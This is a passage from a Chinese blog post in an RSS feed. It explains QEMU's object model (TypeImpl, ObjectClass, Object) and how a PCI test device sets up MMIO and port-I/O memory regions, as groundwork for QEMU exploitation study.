class="keyword">void</span> *class_data;</span><br><span class="line">    InterfaceInfo *interfaces;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">size_t</span> class_size;  <span class="comment">/*该数据类型所代表的类的大小*/</span></span><br><span class="line">    <span class="keyword">size_t</span> instance_size;  <span class="comment">/*该数据类型产生的对象的大小*/</span></span><br><span class="line">    <span class="comment">/*类的 Constructor &amp; Destructor*/</span></span><br><span class="line">    <span class="keyword">void</span> (*class_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_base_init)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> (*class_finalize)(ObjectClass *klass, <span class="keyword">void</span> *data);</span><br><span class="line">    <span class="keyword">void</span> *class_data;</span><br><span class="line">    <span class="comment">/*实例的Contructor &amp; Destructor*/</span></span><br><span class="line">    <span class="keyword">void</span> (*instance_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_post_init)(Object *obj);</span><br><span class="line">    <span class="keyword">void</span> (*instance_finalize)(Object *obj);</span><br><span class="line">    <span class="keyword">bool</span> abstract;  <span class="comment">/*表示类是否是抽象类*/</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *parent;  <span class="comment">/*父类的名字*/</span></span><br><span class="line">    TypeImpl *parent_type;  <span class="comment">/*指向父类TypeImpl的指针*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span>  <span class="comment">/*该类型对应的类的指针*/</span></span><br><span class="line">    <span class="keyword">int</span> num_interfaces;  <span class="comment">/*所实现的接口的数量*/</span></span><br><span class="line">    InterfaceImpl interfaces[MAX_INTERFACES];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//其中InterfaceImpl的定义如下，只是一个类型的名字</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InterfaceImpl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *<span class="keyword">typename</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>TypeImpl</code>的属性与<code>TypeInfo</code>的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl对象。</p><p>如下面定义的<code>pci_test_dev</code>:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> TypeInfo pci_testdev_info = &#123;</span><br><span class="line">        .name          = TYPE_PCI_TEST_DEV,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(PCITestDevState),</span><br><span class="line">        .class_init    = pci_testdev_class_init,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register_static</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> type_register(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">TypeImpl *<span class="title">type_register</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(info-&gt;parent);</span><br><span class="line">    <span class="keyword">return</span> type_register_internal(info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> TypeImpl *<span class="title">type_register_internal</span><span class="params">(<span class="keyword">const</span> TypeInfo *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TypeImpl *ti;</span><br><span class="line">    ti = type_new(info);<span class="comment">//TypeInfo实例化成TypeImpl</span></span><br><span class="line">    type_table_add(ti);<span class="comment">//加入到TypeImpl中的hash表中</span></span><br><span class="line">    <span class="keyword">return</span> ti;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当所有qemu总线、设备等的<code>type_register_static</code>执行完成后，即它们的<code>TypeImpl</code>实例创建成功后，qemu就会在<code>type_initialize</code>函数中取实例化其对应的<code>ObjectClass</code>。</p><p>每个<code>Type</code>都有一个相应的<code>ObjectClass</code>所对应，其中<code>ObjectClass</code>是所有类的基类</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    Type type;  </span><br><span class="line">    GSList *interfaces;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];</span><br><span class="line">    ObjectUnparent *unparent;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用户可以定义自己的类，继承相应类即可：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TypeImpl</span> *<span class="title">Type</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span> <span class="title">ObjectClass</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ObjectClass</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Type type;       <span class="comment">/* points to the current Type&#x27;s instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceClass</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass parent_class;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDeviceClass</span> &#123;</span></span><br><span class="line">        DeviceClass parent_class;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类的初始化会先初始化它的父类，父类初始化完成后，会将相应字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值，同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，<code>TypeInfo::class_init</code>就会调用以实现虚函数的初始化，如下例的<code>pci_testdev_class_init</code>所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pci_testdev_class_init</span><span class="params">(ObjectClass *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        DeviceClass *dc = DEVICE_CLASS(klass);</span><br><span class="line">        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);</span><br><span class="line">        k-&gt;init = pci_testdev_init;</span><br><span class="line">        k-&gt;<span class="built_in">exit</span> = pci_testdev_uninit;</span><br><span class="line">        ...</span><br><span class="line">        dc-&gt;desc = <span class="string">&quot;PCI Test Device&quot;</span>;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一个是<code>Object</code>对象：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    ObjectClass *<span class="class"><span class="keyword">class</span>;</span></span><br><span class="line">    ObjectFree *<span class="built_in">free</span>;</span><br><span class="line">    GHashTable *properties;</span><br><span class="line">    <span class="keyword">uint32_t</span> ref;</span><br><span class="line">    Object *parent;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>Object</code>对象为何物？<code>Type</code>以及<code>ObjectClass</code>只是一个类型，而不是具体的设备。<code>TypeInfo</code>结构体中有两个函数指针：<code>instance_init</code>以及<code>class_init</code>。<code>class_init</code>是负责初始化<code>ObjectClass</code>结构体的，<code>instance_init</code>则是负责初始化具体<code>Object</code>结构体的。</p><blockquote><p>the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device’s -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine).<br>Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。</p></blockquote><p><code>Object</code>示例如下所示：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* include/qom/object.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Object</span> <span class="title">Object</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        ObjectClass *<span class="class"><span class="keyword">class</span>;</span> <span class="comment">/* points to the Type&#x27;s ObjectClass instance */</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/qemu/typedefs.h */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> <span class="title">DeviceState</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> <span class="title">PCIDevice</span>;</span></span><br><span class="line"><span class="comment">/* include/hw/qdev-core.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">DeviceState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        Object parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">        ...</span><br><span class="line"><span class="comment">/* include/hw/pci/pci.h */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">PCIDevice</span> &#123;</span></span><br><span class="line">        DeviceState qdev;</span><br><span class="line">        ...</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">YourDeviceState</span>&#123;</span></span><br><span class="line">        PCIDevice pdev;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>QOM会为设备Object分配<code>instace_size</code>大小的空间，然后调用<code>instance_init</code>函数（在Objectclass的class_init函数中定义）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>最后便是PCI的内存空间了，qemu使用<code>MemoryRegion</code>来表示内存空间，在<code>include/exec/memory.h</code>中定义。使用<code>MemoryRegionOps</code>结构体来对内存的操作进行表示，如<code>PMIO</code>或<code>MMIO</code>。对每个<code>PMIO</code>或<code>MMIO</code>操作都需要相应的<code>MemoryRegionOps</code>结构体，该结构体包含相应的<code>read/write</code>回调函数。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_mmio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_mmio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> MemoryRegionOps pci_testdev_pio_ops = &#123;</span><br><span class="line">        .read = pci_testdev_read,</span><br><span class="line">        .write = pci_testdev_pio_write,</span><br><span class="line">        .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">        .impl = &#123;</span><br><span class="line">                .min_access_size = <span class="number">1</span>,</span><br><span class="line">                .max_access_size = <span class="number">1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>首先使用<code>memory_region_init_io</code>函数初始化内存空间（<code>MemoryRegion</code>结构体），记录空间大小，注册相应的读写函数等；然后调用<code>pci_register_bar</code>来注册BAR等信息。需要指出的是无论是MMIO还是PMIO，其所对应的空间需要显示的指出（即静态声明或者是动态分配），因为<code>memory_region_init_io</code>只是记录空间大小而并不分配。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* hw/misc/pci-testdev.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_IOSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOTEST_MEMSIZE 2048</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">PCITestDevState</span> &#123;</span></span><br><span class="line">        <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">        PCIDevice parent_obj;</span><br><span class="line">        <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line"></span><br><span class="line">        MemoryRegion mmio;</span><br><span class="line">        MemoryRegion portio;</span><br><span class="line">        IOTest *tests;</span><br><span class="line">        <span class="keyword">int</span> current;</span><br><span class="line">&#125; PCITestDevState;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pci_testdev_init</span><span class="params">(PCIDevice *pci_dev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        PCITestDevState *d = PCI_TEST_DEV(pci_dev);</span><br><span class="line">        ...</span><br><span class="line">        memory_region_init_io(&amp;d-&gt;mmio, OBJECT(d), &amp;pci_testdev_mmio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-mmio&quot;</span>, IOTEST_MEMSIZE * <span class="number">2</span>); </span><br><span class="line">        memory_region_init_io(&amp;d-&gt;portio, OBJECT(d), &amp;pci_testdev_pio_ops, d,</span><br><span class="line">                                                    <span class="string">&quot;pci-testdev-portio&quot;</span>, IOTEST_IOSIZE * <span class="number">2</span>); </span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;d-&gt;mmio);</span><br><span class="line">        pci_register_bar(pci_dev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;d-&gt;portio);</span><br></pre></td></tr></table></figure><p>可以在下面的链接中看看一个设备具体怎么实现的</p><p><a href="https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c">https://github.com/rcvalle/blizzardctf2017/blob/master/strng.c</a></p>]]></content:encoded>
      
      <comments>https://billyotry.github.io/2021/06/07/qemu%20pwn%E5%9F%BA%E7%A1%80/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
